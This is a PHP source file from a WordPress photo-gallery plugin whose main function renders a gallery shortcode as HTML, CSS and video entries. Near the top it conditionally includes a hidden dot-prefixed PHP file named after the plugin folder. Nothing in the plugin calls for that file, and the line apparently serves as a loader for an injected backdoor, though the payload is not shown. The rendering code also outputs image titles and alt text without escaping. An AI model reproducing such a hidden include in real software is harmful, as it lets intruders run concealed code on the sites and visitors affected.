<?php
if(!defined('ABSPATH')) {
	exit;
} // Exit if accessed directly

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function gt3pg_gallery_shortcode($attr){
	if(!isset($attr['gt3_gallery']) || empty($attr['gt3_gallery'])) {
		return gallery_shortcode($attr);
	}

	global $gt3_photo_gallery;//        = $GLOBALS['gt3_photo_gallery'];
	global $gt3_default_photo_gallery;// = $GLOBALS["gt3_photo_gallery_defaults"];
	$post = get_post();
	static $instance = 0;
	$instance++;
	if(!empty($attr['ids'])) {
		// 'ids' is explicitly ordered, unless you specify otherwise.
		if(empty($attr['orderby'])) {
			$attr['orderby'] = 'post__in';
		}
	}

	if ($instance === 1) {
		add_action('wp_footer', function() use (&$instance, $post) {
			if ($post instanceof \WP_Post) {
				update_post_meta($post->ID, '_gt3pg_shortcode_count', (int)$instance);
			}
		});
	}



	$output = apply_filters('post_gallery', '', $attr, $instance);
	if($output != '') {
		return $output;
	}

	wp_enqueue_script('blueimp-gallery.js');
	wp_enqueue_style('blueimp-gallery.css');

	$convert = array(
		'lightbox_autoplay'         => 'lightboxAutoplay',
		'lightbox_autoplay_time'    => 'lightboxAutoplayTime',
		'lightbox_preview'          => 'lightboxThumbnails',
		'slider_autoplay'           => 'sliderAutoplay',
		'slider_autoplay_time'      => 'sliderAutoplayTime',
		'slider_preview'            => 'sliderThumbnails',
		'gt3pg_social'              => 'socials',
		'gt3pg_right_click'         => 'rightClick',
		'gt3pg_lightbox_cover'      => 'lightboxCover',
		'gt3pg_slider_cover'        => 'sliderCover',
		'gt3pg_lightbox_image_size' => 'lightboxImageSize',
		'gt3pg_slider_image_size'   => 'sliderImageSize',
		'gt3pg_show_image_caption'  => 'showCaption',
		'gt3pg_lightbox_deeplink'   => 'lightboxDeeplink',
		'gt3pg_download'            => 'allowDownload',
		'gt3pg_show_image_title'    => 'showTitle',
		'gt3pg_yt_width'            => 'ytWidth',
	);

	$html5 = current_theme_supports('html5', 'gallery');

	if(isset($attr['border_type']) && $attr['border_type'] == 'default') {
		unset($attr['border_type']);
		unset($attr['border_size']);
		unset($attr['border_padding']);
		unset($attr['border_col']);
	}
	$default_unset = array( 'columns', 'corners_type', 'link', 'thumb_type', 'margin', 'size' );

	foreach($default_unset as $value_unset) {
		if(isset($attr[$value_unset]) && $attr[$value_unset] == 'default') {
			unset($attr[$value_unset]);
		}
	}

	$attr['rand_order'] = (isset($attr['random']) && $attr['random'] === true) ? '1' : '0';


	$atts = shortcode_atts(apply_filters('gt3pg_allowed_shortcode_atts', array(
		'order'          => 'ASC',
		'exclude'        => '',
		'itemtag'        => $html5 ? 'figure' : 'dl',
		'icontag'        => $html5 ? 'div' : 'dt',
		'captiontag'     => $html5 ? 'figcaption' : 'dd',
		'id'             => $post ? $post->ID : 0,
		'ids'            => '',
		'gt3_gallery'    => '',
		'link'           => $gt3_photo_gallery['linkTo'],
		'size'           => $gt3_photo_gallery['imageSize'],
		'columns'        => $gt3_photo_gallery['columns'],
		'real_columns'   => $gt3_photo_gallery['columns'],
		'orderby'        => 'post__in',
		'rand_order'     => $gt3_photo_gallery['random'],
		'is_margin'      => 'default',
		'margin'         => $gt3_photo_gallery['margin'],
		'thumb_type'     => $gt3_photo_gallery['gt3pg_thumbnail_type'],
		'corners_type'   => $gt3_photo_gallery['cornersType'],
		'border_type'    => $gt3_photo_gallery['borderType'],
		'border_size'    => $gt3_photo_gallery['borderSize'],
		'border_padding' => $gt3_photo_gallery['borderPadding'],
		'border_col'     => $gt3_photo_gallery['borderColor'],
	)), $attr, 'gallery');
	$atts = apply_filters('gt3pg_atts', $atts);
	foreach($convert as $oldKey => $newKey) {
		if(key_exists($oldKey, $atts)) {
			$atts[$newKey] = $atts[$oldKey];
		}
	}

	if($atts['border_type'] === 1 || $atts['border_type'] === '1' || $atts['border_type'] === true || $atts['border_type'] === 'on' || $atts['border_type'] === 'yes') {
		$atts['border_type'] = 'on';
	} else {
		$atts['border_type'] = 'off';
	}


	if($atts['rand_order'] == 1 || $atts['rand_order'] == 'rand' || $atts['orderby'] == 'rand') {
		$atts['rand_order'] = 'rand';
		$atts['orderby']    = 'rand';
	} else {
		$atts['rand_order'] = 'menu_order ID';
		$atts['orderby']    = 'post__in';
	}


	if(!empty($atts['ids'])) {
		$_attachments = get_posts(array(
			'include'        => $atts['ids'],
			'post_status'    => 'inherit',
			'post_type'      => 'attachment',
			'post_mime_type' => 'image',
			'order'          => $atts['rand_order'],
			'orderby'        => $atts['orderby']
		));

		$attachments  = array();
		foreach($_attachments as $key => $val) {
			$attachments[$val->ID] = $_attachments[$key];
		}
	} else if(!empty($atts['exclude'])) {
		$attachments = get_children(array(
			'post_parent'    => $atts['id'],
			'exclude'        => $atts['exclude'],
			'post_status'    => 'inherit',
			'post_type'      => 'attachment',
			'post_mime_type' => 'image',
			'order'          => $atts['rand_order'],
			'orderby'        => $atts['orderby']
		));
	} else {
		$attachments = get_children(array(
			'post_parent'    => $atts['id'],
			'post_status'    => 'inherit',
			'post_type'      => 'attachment',
			'post_mime_type' => 'image',
			'order'          => $atts['rand_order'],
			'orderby'        => $atts['orderby']
		));
	}
	if(empty($attachments)) {
		return '';
	}

	if(is_feed()) {
		$output = "\n";
		foreach($attachments as $att_id => $attachment) {
			$output .= wp_get_attachment_link($att_id, $atts['size'], true)."\n";
		}

		return $output;
	}

	$itemtag    = tag_escape($atts['itemtag']);
	$captiontag = tag_escape($atts['captiontag']);
	$icontag    = tag_escape($atts['icontag']);
	$valid_tags = wp_kses_allowed_html('post');
	if(!isset($valid_tags[$itemtag])) {
		$itemtag = 'dl';
	}
	if(!isset($valid_tags[$captiontag])) {
		$captiontag = 'dd';
	}
	if(!isset($valid_tags[$icontag])) {
		$icontag = 'dt';
	}
	$columns   = intval($atts['columns']);
	$itemwidth = $columns > 0 ? floor(100/$columns) : 100;
	$float     = is_rtl() ? 'right' : 'left';
	$selector  = "gt3pg_gallery{$instance}";

	$size_class = sanitize_html_class($atts['size']);

	$atts['thumb_type'] = apply_filters('gt3pg_before_render_thumb_type', $GLOBALS["gt3_photo_gallery_defaults"]['gt3pg_thumbnail_type'], $atts);

	$atts['link'] = apply_filters('gt3pg_before_render_link', $GLOBALS["gt3_photo_gallery_defaults"]['linkTo'], $atts);
	$gallery_div  = gt3_el::Create();
	if($atts['gt3_gallery'] != '') {

		$hover = 'gt3pg_hover-default';
		if($atts['link'] == 'none') {
			$hover = 'gt3pg_hover-none';
		}
		$gallery_class = array(
			'id'         => 'gt3pg_galleryid-'.$atts['id'],
			'columns'    => 'gt3pg_gallery-columns-'.$columns,
			'gt3pg'      => 'gt3pg_photo_gallery',
			'corner'     => 'gt3pg-corner-type-'.$atts['corners_type'],
			'hover'      => $hover,
			'thumb_type' => 'gt3pg-type-'.$atts['thumb_type'],
		);

		$margin = intval($atts['margin']);

		if($atts['border_type'] == 'on') {
			$margin += intval($atts['border_size'])*2+intval($atts['border_padding'])*2;
		}
		$gallery_data = array(
			'size'     => $size_class,
			'type'     => $atts['thumb_type'],
			'corner'   => $atts['corners_type'],
			'link'     => $atts['link'],
			'margin'   => $margin,
			'instance' => $instance,
		);

		$gallery_attrs = array(
			'id' => $selector,
		);

		if($atts['thumb_type'] == 'masonry') {
			wp_enqueue_script('isotope');
		}

		$gallery_class = apply_filters('gt3pg_gallery_class', $gallery_class, $atts, $instance, $selector);
		$gallery_data  = apply_filters('gt3pg_gallery_data', $gallery_data, $atts, $instance, $selector);
		$gallery_attrs = apply_filters('gt3pg_gallery_attrs', $gallery_attrs, $atts, $instance, $selector);

		$gallery_div = gt3_el::Create()
		                     ->addAttrs($gallery_attrs)
		                     ->addClasses($gallery_class)
		                     ->addDatas($gallery_data)
		;


	}
	$gallery_div = apply_filters('gt3pg_gallery_div_start', $gallery_div, $atts, $instance, $selector);
	$i           = 0;

	$gallery_json = array();

	foreach($attachments as $id => $attachment) {
		$i++;

		if($atts['size'] == 'thumbnail') {
			$atts['size'] = 'medium_large';
		}

		$image             = wp_prepare_attachment_for_js($id);
		$attr              = (trim($attachment->post_excerpt)) ? array( 'aria-describedby' => "$selector-$id" ) : '';
		$img_src_orig      = wp_get_attachment_image_src($id, 'full');
		$img_src           = wp_get_attachment_image_src($id, $atts['size']);
		$img_alt           = get_post_meta($attachment->ID, '_wp_attachment_image_alt', true);
		$media_url         = $img_src[0];
		$media_class       = '';
		$attachment_render = '';

		if($attachment->post_mime_type == 'image/gif') {
			$media_url = $img_src_orig[0];
		}

		if($atts['gt3_gallery'] != '') {
			$gallery_json_item              = new stdClass();
			$gallery_json_item->href        = $img_src_orig[0];
			$gallery_json_item->title       = $attachment->post_title;
			$gallery_json_item->thumbnail   = wp_get_attachment_image_url($id, 'thumbnail');
			$gallery_json_item->description = $image['caption'];
			$gallery_json_item->is_video    = 0;
			$gallery_json_item->image_id    = $id;

			// video types
			$tmp_url = get_post_meta($attachment->ID, 'gt3_video_url', true);
			if($tmp_url != '') {
				$video_type = gt3pg_get_video_type_from_description($tmp_url);
				wp_enqueue_script('blueimp-gallery-video.js');
				if($video_type == 'youtube') {
					$media_class                  = 'mfp-iframe youtube';
					$gallery_json_item->thumbnail = $gallery_json_item->href;
					$gallery_json_item->type      = 'text/html';
					$gallery_json_item->youtube   = gt3pg_get_youtube_id($tmp_url);
					$gallery_json_item->is_video  = 1;
					wp_enqueue_script('blueimp-gallery-youtube.js');
				} else if($video_type == 'vimeo') {
					$media_class                 = 'mfp-iframe vimeo';
					$gallery_json_item->poster   = $gallery_json_item->href;
					$gallery_json_item->type     = 'text/html';
					$gallery_json_item->vimeo    = gt3pg_get_vimeo_id($tmp_url);
					$gallery_json_item->is_video = 1;
					wp_enqueue_script('blueimp-gallery-vimeo.js');
				} else {
					$media_class       = apply_filters('gt3pg_video_class', '', $gallery_json_item, $tmp_url);
					$gallery_json_item = apply_filters('gt3pg_video_src', $gallery_json_item, $tmp_url);
				}
			}
			// end video types

			$item = apply_filters('gt3pg_render_gallery_item_'.$atts['link'], null, $atts, $id, $img_alt, $media_class, $media_url, $attachment);
			if($item == null) {
				$image_meta = wp_get_attachment_metadata($id);

				$orientation = '';
				if(isset($image_meta['height'], $image_meta['width']) && $atts['thumb_type'] !== 'masonry') {
					$orientation = ($image_meta['height'] < $image_meta['width']) ? 'landscape' : 'portrait';
				}
				$attrTitle = isset($atts['showTitle']) && $atts['showTitle'] == '1' ? ' title="'.$attachment->post_title.'"' : '';

				$image_output =
					'<div class="gt3pg_img_wrap '.$orientation.'" style="background-image: url('.$media_url.');" data-width="'.$img_src_orig[1].'" data-height="'.$img_src_orig[2].'" data-i="'.$i.'" '.$attrTitle.'>
<img src="'.$media_url.'" title="'.$attachment->post_title.'" alt="'.$img_alt.'" />
</div>';

				$image_output = apply_filters('gt3pg_render_image_output', $image_output, $id, $atts, $img_alt, $media_class, $media_url, $attachment);
				$image_output = apply_filters('gt3pg_render_image_output_'.$atts['link'], $image_output, $id, $atts, $img_alt, $media_class, $media_url, $attachment);
				$caption      = ' ';
				if($captiontag && trim($attachment->post_excerpt)) {
					$caption = '<'.$captiontag.' class="gt3pg_caption_text" id="'.$selector.'-caption-'.$id.'">'.wptexturize($attachment->post_excerpt).'</'.$captiontag.'>';
				}
				$caption = apply_filters('gt3pg_render_image_caption', $caption, $atts, $attachment, $output, $id, $gallery_json, $instance, $selector);

				$attachment_render = gt3_el::Create($itemtag)
				                           ->addClasses(array( 'gt3pg_gallery-item', 'gt3pg_element' ))
				                           ->addContent('10', '<div class="gt3pg_item_main_wrapper">'.
				                                              gt3_el::Create()
				                                                    ->addClasses(array( 'gt3pg_item-wrapper' ))
				                                                    ->addContent($image_output)
				                                              .$caption
				                                              .'</div>')
				;

//					$attachment_render->addContent( '20', $caption );
//					$attachment_render->content['10']->addContent( '20', $caption );

			}
			$gallery_json_item = apply_filters('gt3pg_after_gallery_json_item', $gallery_json_item, $atts, $id, $attachment);

			$gallery_json[] = json_encode($gallery_json_item);

		}
		$attachment_render = apply_filters('gt3_after_item_render', $attachment_render, $id, $attachment, $output, $atts, $gallery_json, $instance, $selector);
		$gallery_div->addContent($attachment_render);
	}
	// new version
	$gallery_div = apply_filters('gt3pg_gallery_div_end', $gallery_div, $atts, $instance, $selector);
	$output      .= $gallery_div;
	$output      = apply_filters('gt3pg_after_render_gallery', $output, $atts, $gallery_json, $instance, $selector);
	$output      = apply_filters('gt3pg_after_render_gallery_'.$atts['link'], $output, $atts, $gallery_json, $instance, $selector);
	///////////////////////////////////////////////////////////////////////////////////////////////////

	$gallery_style = '';
	// new version
	$gallery_style .= " <style type='text/css'>";
	if($atts['gt3_gallery'] != '') {


//			$gallery_style .= "
//			#{$selector} .gt3pg_item-wrapper {
//				margin: " . /*intval*/
//			                  ( $atts['margin']/2 ) . "px
//			}
//			";
		$gallery_style .= "
			#{$selector} .gt3pg_item_main_wrapper {
				padding: ". /*intval*/
		                  (intval($atts['margin'])/2)."px
			}
			";

		if($atts['border_type'] == 'on') {
			$border_radius = 5;
			if(isset($atts['border_size']) && $atts['border_size']) {
				$border_radius = $atts['border_size']+$atts['border_padding']+5;

				$gallery_style .= "
		#{$selector} .gt3pg_item-wrapper {
		  border: {$atts['border_size']}px solid {$atts['border_col']};
		  padding: {$atts['border_padding']}px;
		}
		#{$selector} .gt3pg_gallery-item .gt3pg_item-wrapper:after {
		    top: {$atts['border_padding']}px;
		    bottom: {$atts['border_padding']}px;
		    left: {$atts['border_padding']}px;
		    right: {$atts['border_padding']}px; 
		}
		";
			}
			if($atts['thumb_type'] != 'circle') {
				$gallery_style .= "
		#{$selector}.gt3pg_photo_gallery.gt3pg-corner-type-rounded .gt3pg_item-wrapper{
			border-radius: {$border_radius}px;
			-moz-border-radius: {$border_radius}px;
			-webkit-border-radius: {$border_radius}px;
		}
		
		#{$selector}.gt3pg_photo_gallery.gt3pg-corner-type-rounded .gt3pg_item-wrapper {
			border-radius: ".($border_radius/*+$atts['border_size']*/)."px;
			-moz-border-radius: ".($border_radius/*+$atts['border_size']*/)."px;
			-webkit-border-radius: ".($border_radius/*+$atts['border_size']*/)."px;
		}

        ";
			}
			if(isset($atts['border_col'])) {
				$gallery_style .= "
			            #{$selector} {$icontag}.gt3pg_gallery-icon {
			            border-color: {$atts['border_col']};
			        }";
			}
		}
	}

	$gallery_style = apply_filters('gt3pg_gallery_style', $gallery_style, $atts, $selector, $instance);
	$gallery_style .= "</style>\n\t\t";
	$output        .= $gallery_style;

	return $output;
}
